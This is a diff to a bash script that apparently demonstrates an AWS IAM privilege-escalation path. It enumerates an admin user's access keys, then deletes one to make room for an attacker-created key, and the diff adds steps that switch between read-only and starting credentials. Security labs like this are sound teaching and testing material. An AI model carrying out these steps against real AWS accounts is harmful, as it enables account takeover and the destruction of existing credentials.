@@ -149,12 +149,13 @@ else
 fi
 echo ""
 
-# [EXPLOIT] Step 5: List existing access keys for the admin user
+# [OBSERVATION] Step 5: List existing access keys for the admin user
 echo -e "${YELLOW}Step 5: Listing existing access keys for admin user${NC}"
+use_readonly_creds
 echo "Target admin user: $ADMIN_USER"
 echo "Using iam:ListAccessKeys to enumerate existing credentials..."
 
-show_cmd "Attacker" "aws iam list-access-keys --user-name $ADMIN_USER --output json"
+show_cmd "ReadOnly" "aws iam list-access-keys --user-name $ADMIN_USER --output json"
 EXISTING_KEYS=$(aws iam list-access-keys --user-name $ADMIN_USER --output json)
 KEY_COUNT=$(echo "$EXISTING_KEYS" | jq '.AccessKeyMetadata | length')
 
@@ -169,6 +170,7 @@ echo -e "${GREEN}✓ Found $KEY_COUNT existing access key(s)${NC}\n"
 
 # [EXPLOIT] Step 6: Delete one of the existing access keys
 echo -e "${YELLOW}Step 6: Deleting one of the existing access keys${NC}"
+use_starting_creds
 echo "To create a new key, we must first delete one of the existing keys (AWS 2-key limit)..."
 
 # Get the first key ID to delete
